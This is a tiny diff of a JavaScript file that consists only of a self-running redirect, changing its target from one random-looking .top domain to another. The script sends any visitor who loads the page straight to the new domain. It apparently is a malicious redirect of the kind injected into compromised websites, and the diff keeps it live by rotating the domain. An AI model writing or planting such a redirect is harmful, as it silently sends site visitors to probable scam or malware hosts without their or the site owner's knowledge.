@@ -1,4 +1,5 @@
 (function() {
-    window['location'] = 'https://letscawlesis.top/';
+    window['location'] = 'https://letisekejaurtsa.top/';
 })();
+
 
